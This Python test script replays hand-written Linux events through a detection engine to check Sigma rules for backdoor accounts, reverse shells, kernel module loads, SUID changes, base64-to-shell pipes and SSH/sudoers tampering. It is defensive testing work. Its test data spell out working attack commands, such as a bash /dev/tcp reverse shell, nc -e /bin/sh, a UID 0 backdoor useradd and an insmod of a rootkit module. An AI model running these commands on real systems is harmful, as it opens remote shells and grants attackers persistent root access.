"""Check Linux rule logic with the real engine: positives and near-miss negatives.

Replays hand-written events, so it needs no sensor. Each case names the rule
that must (or must not) alert for one event; every other loaded rule is
ignored for that event.
"""

import argparse
import hashlib
import json
import shutil
import subprocess
import tempfile
from pathlib import Path

BACKDOOR = "Backdoor Account Creation (Duplicate UID 0)"
DEV_TCP = "Linux Reverse Shell via /dev/tcp"
NC = "Netcat or Socat Reverse Shell Execution"
KMOD = "Kernel Module Load from Suspicious Path"
CHMOD = "SUID/SGID Bit Added via chmod"
B64 = "Base64-Decode Piped to Shell"
SUDOERS = "Sudoers Configuration Tampering"
SSHD = "SSH Daemon Configuration Tampering"
KEYS = "SSH authorized_keys Written"

RULE_FILES = {
    BACKDOOR: "proc_creation_lnx_backdoor_account.yml",
    DEV_TCP: "proc_creation_lnx_shell_dev_tcp_reverse_shell.yml",
    NC: "proc_creation_lnx_nc_exec_reverse_shell.yml",
    KMOD: "proc_creation_lnx_kmod_load_susp_path.yml",
    CHMOD: "proc_creation_lnx_chmod_suid.yml",
    B64: "proc_creation_lnx_base64_pipe_shell.yml",
    SUDOERS: "file_event_lnx_sudoers_tamper.yml",
    SSHD: "file_event_lnx_sshd_config_tamper.yml",
    KEYS: "file_event_lnx_ssh_authorized_keys.yml",
}

# (rule, Image, CommandLine, alerts)
PROCESS_CASES = [
    # Duplicate UID 0: the UID must be 0; --non-unique alone is not enough.
    (BACKDOOR, "/usr/sbin/useradd", "useradd -o -u 0 -g 0 backdoor", True),
    (BACKDOOR, "/usr/sbin/useradd", "useradd --non-unique --uid=0 backdoor", True),
    (BACKDOOR, "/usr/sbin/usermod", "usermod -u 0 -o svc", True),
    (BACKDOOR, "/usr/sbin/useradd", "useradd -ou0 backdoor", True),
    (BACKDOOR, "/usr/sbin/useradd", "useradd --non-unique -u 1001 svc", False),
    (BACKDOOR, "/usr/sbin/useradd", "useradd -o svc", False),
    (BACKDOOR, "/usr/sbin/useradd", "useradd -u 1000 -g 0 svc", False),
    (BACKDOOR, "/usr/sbin/useradd", "useradd -u 0123 svc", False),
    # /dev/tcp: only shells that implement it, wired to a stream.
    (DEV_TCP, "/usr/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", True),
    (DEV_TCP, "/usr/bin/bash", "bash -c 'exec 5<>/dev/tcp/203.0.113.9/4444; cat <&5 >&5'", True),
    (DEV_TCP, "/usr/bin/ksh", "ksh -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", True),
    (DEV_TCP, "/usr/bin/dash", "dash -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", False),
    (DEV_TCP, "/usr/bin/zsh", "zsh -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", False),
    (DEV_TCP, "/usr/bin/bash", "bash -c 'echo ping > /dev/tcp/203.0.113.9/80'", False),
    # nc / socat: an execute flag with a shell, not a bare -c (TLS on OpenBSD nc).
    (NC, "/usr/bin/nc", "nc -lvnp 4444 -e /bin/sh", True),
    (NC, "/usr/bin/nc", "nc 203.0.113.9 4444 -c /bin/bash", True),
    (NC, "/usr/bin/ncat", "ncat --exec /bin/sh 203.0.113.9 4444", True),
    (NC, "/usr/bin/socat", "socat TCP:203.0.113.9:4444 EXEC:/bin/sh", True),
    (NC, "/usr/bin/nc", "nc -c 203.0.113.9 443", False),
    (NC, "/usr/bin/nc", "nc -zv 203.0.113.9 22", False),
    # Kernel modules: insmod by path; modprobe only for a .ko path or config.
    (KMOD, "/usr/sbin/insmod", "insmod /tmp/diamorphine.ko", True),
    (KMOD, "/usr/sbin/modprobe", "modprobe /dev/shm/evil.ko", True),
    (KMOD, "/usr/sbin/modprobe", "modprobe -C /tmp/modprobe.conf nf_tables", True),
    (KMOD, "/usr/sbin/insmod", "insmod /lib/modules/6.1.0/kernel/net/foo.ko", False),
    (KMOD, "/usr/sbin/modprobe", "modprobe nf_tables", False),
    (KMOD, "/usr/sbin/modprobe", "modprobe -n -v home_dir_mod", False),
    (KMOD, "/usr/sbin/modprobe", "modprobe --show-depends /home/notes.txt", False),
    # chmod: the mode is the first non-option argument.
    (CHMOD, "/usr/bin/chmod", "chmod u+s /bin/bash", True),
    (CHMOD, "/usr/bin/chmod", "chmod +s /bin/bash", True),
    (CHMOD, "/usr/bin/chmod", "chmod -R a-x,u+s /srv/app", True),
    (CHMOD, "/usr/bin/chmod", "chmod 4755 /tmp/helper", True),
    (CHMOD, "/usr/bin/chmod", "chmod 02755 /tmp/helper", True),
    (CHMOD, "/usr/bin/chmod", "chmod 755 /usr/local/bin/tool", False),
    (CHMOD, "/usr/bin/chmod", "chmod 644 4755", False),
    (CHMOD, "/usr/bin/chmod", "chmod u-s /bin/bash", False),
    (CHMOD, "/usr/bin/chmod", "chmod 1777 /tmp/shared", False),
    (CHMOD, "/usr/bin/chmod", "chmod 600 u+s", False),
    # base64: the decode flag belongs to base64 and a shell is the next stage.
    (B64, "/usr/bin/bash", "bash -c 'echo aWQK | base64 -d | bash'", True),
    (B64, "/usr/bin/bash", "bash -c 'base64 --decode payload.b64 | sh -s'", True),
    (B64, "/usr/bin/bash", "bash -c 'cat p | base64 -d | /bin/sh'", True),
    (B64, "/usr/bin/bash", "bash -c 'base64 -d payload.b64 > out.bin'", False),
    (B64, "/usr/bin/bash", "bash -c 'echo hi | base64; ls -d /tmp | sh'", False),
    (B64, "/usr/bin/bash", "bash -c 'base64 -d p | gunzip | tee out; echo done | shasum'", False),
]

PKG = "/usr/bin/dpkg"
# (rule, Image, TargetFilename, alerts)
FILE_CASES = [
    (SUDOERS, "/bin/sh", "/etc/sudoers.d/90-backdoor", True),
    (SUDOERS, PKG, "/etc/sudoers.d/90-cloud-init-users", False),
    (SUDOERS, "/usr/bin/rpm", "/etc/sudoers", False),
    (SSHD, "/bin/sh", "/etc/ssh/sshd_config", True),
    (SSHD, PKG, "/etc/ssh/sshd_config", False),
    (SSHD, "/usr/bin/apt-get", "/etc/ssh/sshd_config.d/10-hardening.conf", False),
    (KEYS, "/bin/sh", "/root/.ssh/authorized_keys", True),
    (KEYS, "/usr/bin/python3", "/home/app/.ssh/authorized_keys2", True),
    (KEYS, PKG, "/root/.ssh/authorized_keys", False),
]


def process_event(index, image, command_line):
    return {
        "category": "Process",
        "event_id": 1,
        "fields": {"ProcessId": str(index), "Image": image, "CommandLine": command_line},
    }


def file_event(index, image, path):
    return {
        "category": "File",
        "event_id": 11,
        "fields": {"ProcessId": str(index), "Image": image, "TargetFilename": path},
    }


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--engine", required=True, type=Path)
    args = parser.parse_args()
    engine = args.engine.resolve()
    repo = Path(__file__).resolve().parents[2]
    timestamp = "2026-10-08T08:00:00Z"

    events = []
    expected = set()
    cases = []
    for rule, image, command_line, alerts in PROCESS_CASES:
        cases.append((rule, alerts, lambda i, a=image, c=command_line: process_event(i, a, c)))
    for rule, image, path, alerts in FILE_CASES:
        cases.append((rule, alerts, lambda i, a=image, p=path: file_event(i, a, p)))
    for index, (rule, alerts, build) in enumerate(cases, 1):
        event = build(index)
        event.update(
            event_time=timestamp,
            ingest_seq=index,
            platform="linux",
            provider="ebpf",
            opcode=1,
        )
        events.append(event)
        if alerts:
            expected.add((index, rule))

    with tempfile.TemporaryDirectory(prefix="rustinel-logic-replay-") as directory:
        root = Path(directory)
        rules = root / "sigma"
        rules.mkdir()
        for name in RULE_FILES.values():
            source = next((repo / "rules/sigma/linux").glob(name))
            shutil.copyfile(source, rules / source.name)
        payload = root / "cases.ndjson"
        data = "".join(json.dumps(event) + "\n" for event in events).encode()
        payload.write_bytes(data)
        payload.with_suffix(".manifest.json").write_text(
            json.dumps(
                {
                    "schema_version": 2,
                    "payload": payload.name,
                    "rustinel_version": json.loads(
                        (repo / "compatibility/engine.json").read_text()
                    )["version"],
                    "platform": "linux",
                    "started_at": timestamp,
                    "ended_at": timestamp,
                    "status": "complete",
                    "events": {
                        "received": len(events),
                        "written": len(events),
                        "lost": 0,
                        "source_lost": 0,
                    },
                    "payload_bytes": len(data),
                    "payload_sha256": hashlib.sha256(data).hexdigest(),
                }
            )
        )
        config = root / "config.toml"
        config.write_text(
            f"[scanner]\nsigma_rules_path = {json.dumps(str(rules))}\n"
            'sigma_match_mode = "all"\nyara_enabled = false\n'
            "[ioc]\nenabled = false\n[dedup]\nenabled = false\n"
            f"[logging]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
            f"[alerts]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
        )
        output = root / "alerts.ndjson"
        subprocess.run(
            [str(engine), "replay", str(payload), "--config", str(config), "--output", str(output)],
            check=True,
            timeout=30,
        )
        alerts = [json.loads(line) for line in output.read_text().splitlines()]
        actual = {(alert["process.pid"], alert["rule.name"]) for alert in alerts}
        if actual != expected or len(alerts) != len(expected):
            raise RuntimeError(
                f"Missing alerts: {sorted(expected - actual)}; "
                f"unexpected alerts: {sorted(actual - expected)}"
            )
        print(f"Passed {len(cases)} logic replay cases ({len(expected)} expected alerts).")


if __name__ == "__main__":
    main()
